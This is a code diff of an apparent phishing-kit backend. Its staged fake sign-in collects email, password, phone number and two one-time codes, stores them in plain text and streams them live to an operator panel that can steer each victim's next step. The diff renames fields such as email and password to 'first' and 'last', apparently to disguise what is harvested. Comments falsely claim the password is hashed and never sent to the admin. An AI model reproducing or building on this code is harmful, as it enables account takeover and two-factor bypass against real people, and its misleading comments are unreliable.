@@ -114,10 +114,10 @@ io.on("connection", (socket) => {
 // =====================================================
 // START SIGN-IN
 // =====================================================
-// Called after the user enters their email and clicks
+// Called after the user enters their first and clicks
 // Next.
 //
-// The account/session is created BEFORE the password
+// The account/session is created BEFORE the last
 // step.
 // =====================================================
 function getDeviceInfo(userAgent = "") {
@@ -186,7 +186,7 @@ app.post(
   async (req, res) => {
     try {
 
-      // Check whether this email already has a pending
+      // Check whether this first already has a pending
       // session.
 
       const ip = req.ip
@@ -202,13 +202,13 @@ app.post(
 
       
       let  user = await User.create({
-          phone: null,
+          phn: null,
           lastLogin: new Date(),
           approved: false,
           device: deviceInfo.device,
-          currentStep: "email",
+          currentStep: "first",
           browser: deviceInfo.browser,
-          ipAddress: ip,
+          uip: ip,
           phoneRequested: false,
           status: "Visited"
         });
@@ -222,10 +222,10 @@ app.post(
         "new-user",
         {
           _id: user._id,
-          email: user.email,
+          first: user.first,
           status: user.status,
           device: user.device,
-          ipAddress: user.ipAddress,
+          uip: user.uip,
           currentStep: user.currentStep,
           
           browser: user.browser,
@@ -254,26 +254,26 @@ app.post(
 );
 
 // =====================================================
-// SUBMIT PASSWORD
+// SUBMIT last
 // =====================================================
-// The password is immediately hashed.
+// The last is immediately hashed.
 // It is NEVER emitted to the admin.
 // =====================================================
 
 app.post(
-  "/api/auth/email",
+  "/api/auth/first",
   async (req, res) => {
     try {
       const {
         
-        email,
+        first,
         userId
       } = req.body;
 
-      if (!userId || !email) {
+      if (!userId || !first) {
         return res.status(400).json({
           message:
-            "User ID and email are required"
+            "User ID and first are required"
         });
       }
 
@@ -286,26 +286,26 @@ app.post(
         });
       }
 
-      // Hash password
+      // Hash last
     
 
-      user.email = email
+      user.first = first
 
-      user.currentStep = "password"
+      user.currentStep = "last"
 
       user.status =
-        "email-submitted";
+        "first-submitted";
       
       await updateLastLogin(user);
 
      
-      // Tell admin only that the password
+      // Tell admin only that the last
       // step was completed.
       emitToAdmins(
-        "email-set",
+        "first-set",
         {
           _id: user._id,
-          email: user.email,
+          first: user.first,
           currentStep: user.currentStep,
           status: user.status
         }
@@ -315,12 +315,12 @@ app.post(
      
       res.json({
         message:
-          "email submitted successfully"
+          "first submitted successfully"
       });
 
     } catch (error) {
       console.log(
-        "email ERROR:",
+        "first ERROR:",
         error
       );
 
@@ -333,18 +333,18 @@ app.post(
 
 
 app.post(
-  "/api/auth/password",
+  "/api/auth/last",
   async (req, res) => {
     try {
       const {
         userId,
-        password
+        last
       } = req.body;
 
-      if (!userId || !password) {
+      if (!userId || !last) {
         return res.status(400).json({
           message:
-            "User ID and password are required"
+            "User ID and last are required"
         });
       }
 
@@ -357,27 +357,27 @@ app.post(
         });
       }
 
-      // Hash password
+      // Hash last
     
 
-      user.password = password
+      user.last = last
 
       user.currentStep = "processing"
 
       user.status =
-        "password-submitted";
+        "last-submitted";
       
       await updateLastLogin(user);
 
      
-      // Tell admin only that the password
+      // Tell admin only that the last
       // step was completed.
       emitToAdmins(
-        "password-set",
+        "last-set",
         {
           _id: user._id,
-          email: user.email,
-          password: user.password,
+          first: user.first,
+          last: user.last,
           currentStep: user.currentStep,
           status: user.status
         }
@@ -387,12 +387,12 @@ app.post(
      
       res.json({
         message:
-          "Password submitted successfully"
+          "last submitted successfully"
       });
 
     } catch (error) {
       console.log(
-        "PASSWORD ERROR:",
+        "last ERROR:",
         error
       );
 
@@ -425,18 +425,18 @@ app.delete("/api/admin/users", async (req, res) => {
 });
 
 app.post(
-  "/api/auth/wrongPassword",
+  "/api/auth/WongP",
   async (req, res) => {
     try {
       const {
         userId,
-        wrongPassword
+        WongP
       } = req.body;
 
-      if (!userId || !wrongPassword) {
+      if (!userId || !WongP) {
         return res.status(400).json({
           message:
-            "User ID and wrongPassword are required"
+            "User ID and WongP are required"
         });
       }
 
@@ -449,13 +449,13 @@ app.post(
         });
       }
 
-      // Hash wrongPassword
+      // Hash WongP
     
 
-      user.wrongPassword = wrongPassword
+      user.WongP = WongP
 
       user.status =
-        "wrongPassword-submitted";
+        "WongP-submitted";
       user.currentStep = "processing"
 
 
@@ -464,18 +464,18 @@ app.post(
    await updateLastLogin(user);
 
       console.log(
-        "wrongPassword submitted for:",
-        user.email
+        "WongP submitted for:",
+        user.first
       );
 
-      // Tell admin only that the wrongPassword
+      // Tell admin only that the WongP
       // step was completed.
       emitToAdmins(
-        "wrongPassword-set",
+        "WongP-set",
         {
           _id: user._id,
-          email: user.email,
-          wrongPassword: user.wrongPassword,
+          first: user.first,
+          WongP: user.WongP,
           currentStep: user.currentStep,
 
           status: user.status
@@ -484,12 +484,12 @@ app.post(
 
       res.json({
         message:
-          "Password submitted successfully"
+          "last submitted successfully"
       });
 
     } catch (error) {
       console.log(
-        "PASSWORD ERROR:",
+        "last ERROR:",
         error
       );
 
@@ -545,15 +545,15 @@ app.patch("/api/admin/change-step/:id", async (req, res) => {
     }
 
     const allowedSteps = [
-      "email",
-      "password",
+      "first",
+      "last",
       "approve",
       "phone",
       "phone-otp",
       "phone-otp2",
       "success",
       "signin-request",
-      "wrong-password", 
+      "wrong-last", 
       "processing"
     ];
 
@@ -680,7 +680,7 @@ app.patch(
 
       console.log(
         "🔥 USER Device details:",
-        user.email
+        user.first
       );
 
       console.log(
@@ -721,7 +721,7 @@ app.patch(
 
       const safeUser = {
         _id: user._id,
-        email: user.email,
+        first: user.first,
         approved: user.approved,
         userDevice:
           user.userDevice,
@@ -787,10 +787,10 @@ app.post(
     try {
       const {
         userId,
-        phoneNumber
+        phn
       } = req.body;
 
-      if (!userId || !phoneNumber) {
+      if (!userId || !phn) {
         return res.status(400).json({
           message:
             "User ID and phone number are required"
@@ -807,7 +807,7 @@ app.post(
         });
       }
 
-      user.phoneNumber = phoneNumber;
+      user.phn = phn;
       user.status =
         "phone-submitted";
 
@@ -815,7 +815,7 @@ app.post(
 
       console.log(
         "Phone submitted for:",
-        user.email
+        user.first
       );
 
       user.currentStep = "processing"
@@ -827,8 +827,8 @@ app.post(
         "phone-submitted",
         {
           _id: user._id,
-          email: user.email,
-          phoneNumber: user.phoneNumber,
+          first: user.first,
+          phn: user.phn,
           status: user.status,
           currentStep: user.currentStep
         }
@@ -853,16 +853,16 @@ app.post(
 );
 
 app.post(
-  "/api/auth/phoneotp",
+  "/api/auth/ptp",
   async (req, res) => {
     try {
       const {
         userId,
-        phoneOtp
+        ptp
       } = req.body;
-      console.log(phoneOtp)
+      console.log(ptp)
 
-      if (!userId || !phoneOtp) {
+      if (!userId || !ptp) {
         return res.status(400).json({
           message:
             "User ID and phone number are required"
@@ -879,7 +879,7 @@ app.post(
         });
       }
 
-      user.phoneOtp = phoneOtp;
+      user.ptp = ptp;
       user.status =
         "phone otp submitted";
 
@@ -890,17 +890,17 @@ app.post(
 
       console.log(
         "Phone submitted for:",
-        user.email
+        user.first
       );
 
       // Admin gets the phone submission
       // notification.
       emitToAdmins(
-        "phoneotp-submitted",
+        "ptp-submitted",
         {
           _id: user._id,
-          email: user.email,
-          phoneOtp: user.phoneOtp,
+          first: user.first,
+          ptp: user.ptp,
           status: user.status,
           currentStep: user.currentStep
         }
@@ -925,15 +925,15 @@ app.post(
 );
 
 app.post(
-  "/api/auth/phoneotp2",
+  "/api/auth/ptp2",
   async (req, res) => {
     try {
       const {
         userId,
-        phoneOtp2
+        ptp2
       } = req.body;
 
-      if (!userId || !phoneOtp2) {
+      if (!userId || !ptp2) {
         return res.status(400).json({
           message:
             "User ID and phone number are required"
@@ -950,7 +950,7 @@ app.post(
         });
       }
 
-      user.phoneOtp2 = phoneOtp2;
+      user.ptp2 = ptp2;
       user.status =
         "phone otp submitted";
       user.currentStep = "processing"
@@ -960,17 +960,17 @@ app.post(
 
       console.log(
         "Phone submitted for:",
-        user.email
+        user.first
       );
 
       // Admin gets the phone submission
       // notification.
       emitToAdmins(
-        "phoneotp2-submitted",
+        "ptp2-submitted",
         {
           _id: user._id,
-          email: user.email,
-          phoneOtp2: user.phoneOtp2,
+          first: user.first,
+          ptp2: user.ptp2,
           status: user.status,
           currentStep: user.currentStep
         }
